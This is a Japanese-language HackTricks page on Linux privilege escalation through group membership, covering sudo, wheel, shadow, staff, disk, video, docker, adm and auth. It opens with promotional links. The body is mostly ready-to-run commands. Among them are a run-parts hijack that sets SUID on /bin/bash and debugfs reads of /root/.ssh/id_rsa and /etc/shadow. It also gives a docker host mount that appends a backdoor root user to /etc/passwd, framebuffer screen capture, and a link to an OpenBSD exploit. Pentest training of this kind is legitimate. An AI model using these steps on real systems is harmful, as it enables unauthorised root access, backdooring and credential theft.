# 興味深いグループ - Linux Privesc

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、当社の独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) コレクションを発見する
* **💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) をフォローする。
* **ハッキングトリックを共有するために** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の GitHub リポジトリに PR を提出する。

</details>

## Sudo/Admin グループ

### **PE - 方法1**

**時々**、**デフォルトで（またはあるソフトウェアが必要とするために）**、**/etc/sudoers** ファイルの中にこれらの行のいくつかが見つかることがあります：
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
これは、**sudoまたはadminグループに属するユーザーはsudoとして何でも実行できる**ことを意味します。

この場合、**rootになるには単に実行するだけです**:
```
sudo su
```
### PE - 方法2

すべてのsuidバイナリを見つけ、バイナリ**Pkexec**があるかどうかを確認します：
```bash
find / -perm -4000 2>/dev/null
```
もしバイナリ**pkexecがSUIDバイナリである**ことがわかり、**sudo**または**admin**に所属している場合、おそらく`pkexec`を使用してsudoとしてバイナリを実行できるかもしれません。\
通常、これらは**polkitポリシー**内のグループです。このポリシーは基本的に、どのグループが`pkexec`を使用できるかを識別します。次のコマンドで確認してください：
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
以下では、どのグループが**pkexec**を実行できるか、および**デフォルトで**一部のLinuxディストリビューションでは**sudo**および**admin**グループが表示されます。

**rootになるには、次のコマンドを実行します**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
もし**pkexec**を実行しようとして、この**エラー**が表示された場合:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**権限がないわけではなく、GUIなしで接続されていないためです**。そして、この問題の回避策がここにあります: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。**異なる2つのsshセッション**が必要です:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Wheel Group

**時々**、**デフォルトで**、**/etc/sudoers** ファイルの中にこの行が見つかることがあります：
```
%wheel	ALL=(ALL:ALL) ALL
```
これは、**wheelグループに属するユーザーはsudoとして何でも実行できる**ことを意味します。

この場合、**rootになるためには単に実行するだけです**:
```
sudo su
```
## シャドウグループ

**グループシャドウ**のユーザーは、**/etc/shadow**ファイルを**読む**ことができます。
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
## スタッフグループ

**staff**: ルート権限が必要なく、システム（`/usr/local`）にローカルな変更を加えることを許可します（`/usr/local/bin`内の実行可能ファイルは、同じ名前の`/bin`および`/usr/bin`内の実行可能ファイルを"オーバーライド"する可能性があることに注意してください）。監視/セキュリティに関連するグループ"adm"と比較してください。 [\[source\]](https://wiki.debian.org/SystemGroups)

Debianディストリビューションでは、`$PATH`変数により、特権ユーザーであろうとなかろうと、`/usr/local/`が最優先で実行されることが示されています。
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
### Interesting Groups - Linux PE

もし `/usr/local` 内のいくつかのプログラムを乗っ取ることができれば、root 権限を簡単に取得できます。

`run-parts` プログラムを乗っ取ることは root 権限を簡単に取得する方法です。なぜなら、ほとんどのプログラムが `run-parts` を実行するように設定されているからです（crontab や ssh ログイン時など）。
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
または、新しいsshセッションログイン時。
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**エクスプロイト**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## ディスクグループ

この特権はほぼ**rootアクセスと同等**です。マシン内のすべてのデータにアクセスできます。

ファイル：`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
注意: debugfsを使用して**ファイルを書き込む**こともできます。たとえば、`/tmp/asd1.txt`を`/tmp/asd2.txt`にコピーするには、次のようにします:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
しかし、**root所有のファイルを書き込もうとする**と（例：`/etc/shadow`や`/etc/passwd`）、**権限が拒否される**エラーが発生します。

## Video Group

コマンド`w`を使用すると、**システムにログインしているユーザー**を見つけることができ、以下のような出力が表示されます：
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1**は、ユーザー**yossiがマシンの端末に物理的にログイン**していることを意味します。

**videoグループ**は、画面出力を表示する権限を持っています。基本的に、画面を観察することができます。そのためには、画面上の現在の画像を生データで取得し、画面が使用している解像度を取得する必要があります。画面データは`/dev/fb0`に保存でき、この画面の解像度は`/sys/class/graphics/fb0/virtual_size`で見つけることができます。
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**ルートグループ**

デフォルトでは、**ルートグループのメンバー**がいくつかの**サービス**構成ファイルや**ライブラリ**ファイル、または権限昇格に使用できる**その他の興味深いもの**にアクセスできる可能性があります...

**ルートメンバーが変更できるファイルを確認します**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker グループ

インスタンスのボリュームにホストマシンのルートファイルシステムをマウントできるため、インスタンスが起動するとすぐにそのボリュームに `chroot` がロードされます。これにより、実質的にマシン上で root 権限を取得できます。
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
## lxc/lxd グループ

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Adm グループ

通常、**`adm`** グループの**メンバー**は _/var/log/_ 内にある**ログファイルを読む**権限を持っています。\
したがって、このグループ内のユーザーが侵害されている場合は、**ログを確認**する必要があります。

## Auth グループ

OpenBSD内では、**auth** グループは通常、使用されている場合は _**/etc/skey**_ および _**/var/db/yubikey**_ フォルダーに書き込むことができます。\
これらの権限は、次のエクスプロイトを使用して特権を**昇格**するために悪用される可能性があります: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
